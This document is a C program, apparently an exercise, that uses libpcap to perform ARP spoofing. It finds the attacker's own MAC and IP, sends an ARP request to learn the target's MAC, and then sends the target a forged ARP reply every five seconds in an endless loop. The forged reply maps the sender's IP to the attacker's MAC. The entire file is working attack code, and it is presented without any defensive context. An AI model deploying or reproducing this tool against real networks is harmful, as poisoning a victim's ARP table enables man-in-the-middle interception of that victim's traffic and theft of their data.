#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>


void get_mac_address(u_int8_t *mac_address, u_int8_t *interface)
{
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
	close(fd);
}

void get_ip_address(u_int8_t *ip_address, u_int8_t *interface) {
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	memcpy(ip_address, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
	close(fd);
}


int main(int argc, char *argv[])
{
	pcap_t *handle;
	struct pcap_pkthdr *header;
	u_int8_t errbuf[PCAP_ERRBUF_SIZE];
	u_int8_t *interface = argv[1];
	u_int8_t attacker_mac[6];
	u_int8_t attacker_ip[4];
	u_int8_t target_mac[6];
        u_int8_t target_ip[4];
        u_int8_t sender_ip[4];
	u_int8_t packet[42];
	const u_int8_t *packet_get;

	handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
/*set target's and sender's ip address*/	
	inet_pton(AF_INET, argv[3], target_ip);
	inet_pton(AF_INET, argv[2], sender_ip);

	
	
/*PART_1 : find attacker's ip and mac address*/

	get_mac_address(attacker_mac, interface);
	get_ip_address(attacker_ip, interface);

	printf("Attacker's mac address = %02x:%02x:%02x:%02x:%02x:%02x\n", attacker_mac[0],attacker_mac[1],attacker_mac[2],attacker_mac[3], attacker_mac[4], attacker_mac[5]);
	printf("Attacker's  ip address = %d.%d.%d.%d\n", attacker_ip[0],attacker_ip[1],attacker_ip[2],attacker_ip[3]);

/*PART_2 : make arp packet (attacker -> target)*/
	//ethernet header Destination : Broadcast
	packet[0] = 0xff;packet[1] = 0xff;packet[2] = 0xff;packet[3] = 0xff;packet[4] = 0xff;packet[5] = 0xff;
	//ethernet header Source
	packet[6] = attacker_mac[0];packet[7] = attacker_mac[1];packet[8] = attacker_mac[2];packet[9] = attacker_mac[3];packet[10] = attacker_mac[4];packet[11] = attacker_mac[5];
	//ehternet header Type
	packet[12] = 0x08; packet[13] = 0x06;
	//arp header basic setting
	packet[14] = 0x00;packet[15] = 0x01;packet[16] = 0x08;packet[17] = 0x00;packet[18] = 0x06;packet[19] = 0x04;packet[20] = 0x00;packet[21] = 0x01;
	//arp header Source Hardware Address
	packet[22] = attacker_mac[0];packet[23] = attacker_mac[1];packet[24] = attacker_mac[2];packet[25] = attacker_mac[3];packet[26] = attacker_mac[4];packet[27] = attacker_mac[5];
	//arp header Source Protocol Address
	packet[28] = attacker_ip[0];packet[29] = attacker_ip[1];packet[30] = attacker_ip[2];packet[31] = attacker_ip[3];
	//arp header Destination Hardware Address
	packet[32] = 0x00; packet[33] = 0x00; packet[34] = 0x00; packet[35] = 0x00; packet[36] = 0x00; packet[37] = 0x00;
	//arp header Destination Protocol Address
	packet[38] = target_ip[0];packet[39] = target_ip[1];packet[40] = target_ip[2];packet[41] = target_ip[3];


	pcap_sendpacket(handle, packet, 42);



/*PART_3 : get arp reply and find target's mac address*/
	while(1)
	{
		pcap_next_ex(handle, &header, &packet_get);
		if( (packet_get[12] == 0x08) && (packet_get[13] == 0x06) && (packet_get[20] == 0x00) && (packet_get[21] == 0x02) && (packet_get[28] == target_ip[0]) &&
		(packet_get[29] == target_ip[1]) && (packet_get[30] == target_ip[2]) && (packet_get[31] == target_ip[3]) )
			break;
	}

	//get target's mac address
	target_mac[0] = packet_get[22];target_mac[1] = packet_get[23];target_mac[2] = packet_get[24];target_mac[3] = packet_get[25];target_mac[4] = packet_get[26];target_mac[5] = packet_get[27];

	printf("Target's mac address : %02x:%02x:%02x:%02x:%02x:%02x\n",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);

/*PART_4 : send fake arp reply packet to target and change target's arp table*/

	//ethernet header Destination : Unicast
	packet[0] = target_mac[0];packet[1] = target_mac[1];packet[2] = target_mac[2];packet[3] = target_mac[3];packet[4] = target_mac[4];packet[5] = target_mac[5];
	//ethernet header Source
	packet[6] = attacker_mac[0];packet[7] = attacker_mac[1];packet[8] = attacker_mac[2];packet[9] = attacker_mac[3];packet[10] = attacker_mac[4];packet[11] = attacker_mac[5];
	//ehternet header Type : arp
	packet[12] = 0x08; packet[13] = 0x06;
	//arp header basic setting
	packet[14] = 0x00;packet[15] = 0x01;packet[16] = 0x08;packet[17] = 0x00;packet[18] = 0x06;packet[19] = 0x04;packet[20] = 0x00;packet[21] = 0x02; // fake reply
	//arp header Source Hardware Address
	packet[22] = attacker_mac[0];packet[23] = attacker_mac[1];packet[24] = attacker_mac[2];packet[25] = attacker_mac[3];packet[26] = attacker_mac[4];packet[27] = attacker_mac[5];
	//arp header Source Protocol Address
	packet[28] = sender_ip[0];packet[29] = sender_ip[1];packet[30] = sender_ip[2];packet[31] = sender_ip[3]; // sender's ip address
	//arp header Destination Hardware Address
	packet[32] = target_mac[0]; packet[33] = target_mac[1]; packet[34] = target_mac[2]; packet[35] = target_mac[3]; packet[36] = target_mac[4]; packet[37] = target_mac[5];
	//arp header Destination Protocol Address
	packet[38] = target_ip[0];packet[39] = target_ip[1];packet[40] = target_ip[2];packet[41] = target_ip[3];

	while(1)
	{
		pcap_sendpacket(handle, packet, 42);
		sleep(5);

	}


	return 0;
}















